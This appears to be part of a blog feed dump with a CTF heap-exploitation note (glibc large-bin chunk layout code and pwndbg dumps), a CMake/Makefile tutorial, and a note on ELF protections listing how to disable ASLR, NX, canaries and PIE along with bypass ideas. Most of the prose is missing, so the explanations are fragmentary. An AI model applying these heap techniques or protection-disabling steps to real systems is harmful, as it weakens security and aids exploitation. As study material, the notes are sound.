class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">//  b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin  p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin  p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bk bypass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># bk2bytesize1byte</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure><p>fd bypass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul><li>kernel  list_head  <strong></strong>  msg_msg </li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://www.anquanke.com/post/id/197635">How2HeapUnsafe_unlink</a></li><li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-Unsafe Unlink)</a></li><li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cmake</title>
      <link href="/2023/09/09/Cmake%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/09/09/Cmake%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><p> GNU MakeLinux </p><p></p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">@echo <span class="string">&quot;begin make&quot;</span></span><br><span class="line">@<span class="variable">$(CXX)</span>  <span class="variable">$^</span> -o <span class="variable">$(TARGET)</span></span><br><span class="line">@echo <span class="string">&quot;build success&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ,  `-` </span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hello/</span><br><span class="line"> main.cpp</span><br><span class="line"> factorial.cpp</span><br><span class="line"> printhello.cpp</span><br><span class="line"> functions.h</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ main.cpp factorial.cpp printhello.cpp -o main</span><br><span class="line">./main</span><br></pre></td></tr></table></figure><h3 id="version1"><a href="#version1" class="headerlink" title="version1"></a>version1</h3><p>tab</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello: main.cpp printhello.cpp factorial.cpp</span></span><br><span class="line">g++ -o hello main.cpp printhello.cpp factorial.cpp</span><br></pre></td></tr></table></figure><h3 id="version2"><a href="#version2" class="headerlink" title="version2"></a>version2</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$(TARGET)</span> <span class="variable">$(OBJ)</span></span><br><span class="line"></span><br><span class="line"><span class="section">main.o: main.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c main.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">printhello.o: printhello.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c printhello.cpp</span><br><span class="line"></span><br><span class="line"><span class="section">factorial.o: factorial.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> -c factorial.cpp</span><br></pre></td></tr></table></figure><h3 id="version3"><a href="#version3" class="headerlink" title="version3"></a>version3</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line">OBJ = main.o printhello.o factorial.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wall warning all</span></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHONY  clean </span></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><h3 id="version4"><a href="#version4" class="headerlink" title="version4"></a>version4</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CXX = g++</span><br><span class="line">TARGET = hello </span><br><span class="line"></span><br><span class="line"><span class="comment"># cpp</span></span><br><span class="line">SRC = <span class="variable">$(<span class="built_in">wildcard</span> *.cpp)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  SRC.cpp.o</span></span><br><span class="line">OBJ = <span class="variable">$(<span class="built_in">patsubst</span> %.cpp, %.o, <span class="variable">$(SRC)</span>)</span></span><br><span class="line"></span><br><span class="line">CXXFLAGS = -c -Wall</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(OBJ)</span></span><br><span class="line"><span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">%.o: %.cpp</span></span><br><span class="line"><span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> <span class="variable">$&lt;</span> -o <span class="variable">$@</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f *.o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p>Linux cmake <strong> makefile</strong> make </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cmake .</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>Windows </p><ol><li>MinGW  MSVC</li><li>CMake</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake <span class="literal">-B</span> build</span><br><span class="line">cmake <span class="literal">--build</span> build</span><br></pre></td></tr></table></figure><p> VsCode </p><p>Ctrl + shift + p   cmake build build exe</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p> CmakeLists</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ cmake  ]]</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line"><span class="keyword">project</span> (<span class="keyword">test</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line"><span class="keyword">add_executable</span> (main main.cpp)</span><br></pre></td></tr></table></figure><p>set </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>(SRC main.cpp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">add_executable</span> (main <span class="variable">$&#123;SRC&#125;</span>)</span><br></pre></td></tr></table></figure><p>C&#x2F;C++   <code>-std=c99</code></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span>(CMAKE_C_STANDARD <span class="number">11</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">11</span>)</span><br></pre></td></tr></table></figure><p>file</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB &lt;variable&gt; [LIST_DIRECTORIES <span class="keyword">true</span>[<span class="keyword">false</span>]] [RELATIVE &lt;path&gt; ] [CONFIGURE_DEPENDS] [&lt;globbing-expression&gt; ...])</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  /usr/lib/inlcude/  c  SRC ]]</span></span><br><span class="line"><span class="keyword">file</span>(GLOB SRC /usr/lib/inlcude/*.c)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[ CMakeLists ]]</span></span><br><span class="line">CMAKE_CURRENT_SOURCE_DIR </span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ CMakeLists.txt ]]</span></span><br><span class="line">CMAKE_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  CMakeLists.txt  ]]</span></span><br><span class="line">PROJECT_SOURCE_DIR</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[ set ]]</span></span><br><span class="line">EXECUTABLE_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line">LIBRARY_OUTPUT_PATH</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line">CMAKE_CXX_FLAGS</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message</span>()</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_library</span>(&lt;name&gt; [STATIC | SHARED | MODULE]</span><br><span class="line">            [EXCLUDE_FROM_ALL]</span><br><span class="line">            [source1] [source2 ...])</span><br><span class="line"><span class="comment">#[[ STATIC() SHARED() MODULE() ]]</span></span><br></pre></td></tr></table></figure><p> <code>gcc -lpthread</code></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">target_link_libraries</span>(main pthread)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;CMAKE_CURRENT_SOURCE_DIR&#125;</span>/<span class="keyword">include</span>/)</span><br></pre></td></tr></table></figure><p>file</p><p> web </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">server</span><br><span class="line">|-- client</span><br><span class="line">||-- client.c</span><br><span class="line">||-- CMakeLists.txt</span><br><span class="line">|-- server</span><br><span class="line">||-- server.c</span><br><span class="line">||-- CMakeLists.txt</span><br><span class="line">|-- CMakeLists.txt</span><br></pre></td></tr></table></figure><p> CmakeLists.txt</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#[[  ]]</span></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (tftp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">add_subdirectory</span>(client)                </span><br><span class="line"><span class="keyword">add_subdirectory</span>(server)</span><br></pre></td></tr></table></figure><p>clent &amp; server</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (server)</span><br><span class="line"><span class="keyword">add_executable</span> (server server.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[[-----------------------------]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cmake_minimum_required</span> (VERSION <span class="number">3.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">project</span> (client)</span><br><span class="line"><span class="keyword">add_executable</span> (client client.cpp)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>include (packet: client  server )</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD_LIBRARY</span>(packet STATIC packet.cpp)</span><br></pre></td></tr></table></figure><p> + </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">link_directories</span>(</span><br><span class="line">    <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/lib</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">target_link_libraries</span>(client PUBLIC packet)</span><br></pre></td></tr></table></figure><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><p>cpp</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">add_executable</span> (client client.cpp <span class="variable">$&#123;CMAKE_SOURCE_DIR&#125;</span>/packet/packet.cpp)</span><br></pre></td></tr></table></figure><h2 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h2><blockquote><p> vscode  LLVM debug~~CLion  ~~</p></blockquote><p>vscode + llvm + clangd + code-lldb</p><ul><li>cmake</li></ul><p>f5  <code>.vscode</code> <code>launch.json</code><code>program</code> </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/build/Debug/test.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span></span><br><span class="line">       <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="punctuation">]</span></span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>lldb  gdb  debug  </p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cmake </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2023/08/26/%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><h4 id="relro"><a href="#relro" class="headerlink" title="relro"></a>relro</h4><p>read only relocation: linkerbinarydynamic linker relocation.</p><ul><li> got got </li></ul><p>gcc </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-z norelro   <span class="comment"># </span></span><br><span class="line">-z lazy      <span class="comment"># </span></span><br><span class="line">-z now       <span class="comment"># </span></span><br></pre></td></tr></table></figure><h4 id="aslr"><a href="#aslr" class="headerlink" title="aslr"></a>aslr</h4><p>Address Space Layout Randomization,  PIE </p><p>LinuxASLR0&#x2F;1&#x2F;2randomize_va_space</p><ul><li>0ASLR</li><li>1<strong>mmap()VSDO</strong></li><li>21<strong>brk(heap)</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span>  /proc/sys/kernel/randomize_va_space</span><br><span class="line">  2</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p> gdb </p><p> aslr system() 0x1234aslrsystem</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>No-eXecute DEP(Data Execute Protector)</p><p>shellcodeCPU</p><p>gcc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-z execstack    <span class="comment"># </span></span><br><span class="line">-z noexecstack  <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>bypass: shellcode**ROP(Return-oriented programming)**bypass</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>Position independent code, <br>.text, .data.bssASLRPIEgadget</p><p>PIE640x400000</p><p>gcc </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-no-pie    <span class="comment"># pie</span></span><br><span class="line">-pie       <span class="comment"># pie</span></span><br></pre></td></tr></table></figure><p>aslrtextgadgetpietextgadget</p><ul><li>bypass<ul><li>partial write: PIE<strong></strong>0x1000128<ul><li>leak: </li></ul></li><li>vdso&#x2F;vsyscall: vsyscallvsyscall  ret <code>ret</code>  <code>cat /proc/&lt;pid&gt;/maps</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__vsyscall_page:</span><br><span class="line"> mov $__NR_gettimeofday, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_time, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"></span><br><span class="line"> .balign <span class="number">1024</span>, <span class="number">0xcc</span></span><br><span class="line"> mov $__NR_getcpu, %rax</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure><h4 id="stack-canary"><a href="#stack-canary" class="headerlink" title="stack canary"></a>stack canary</h4><p> canary <strong> cookie </strong>cookiecookieshellcodeLinuxcookiecanary</p><p>Linux canary  <code>\x00</code></p><p>gcc </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fno-stack-protector   <span class="comment"># canary</span></span><br><span class="line"></span><br><span class="line">-fstack-protector          <span class="comment"># alloca()8buffer</span></span><br><span class="line">-fstack-protector-all      <span class="comment"># </span></span><br><span class="line">-fstack-protector-strong   <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>canary<a href="https://zhuanlan.zhihu.com/p/434821566">LinuxFSGSBASE</a></p><p>Linux x86-64fs&#x2F;gs</p><ul><li><strong>fsglibc TLS(TLSThread Local Storage)stack canaryglibcgs</strong></li><li><strong>gspercpustack canaryfs</strong></li></ul><p>stack canary __stack_chk_guard(fs:0x28) canary, gcc&#x2F;clang</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 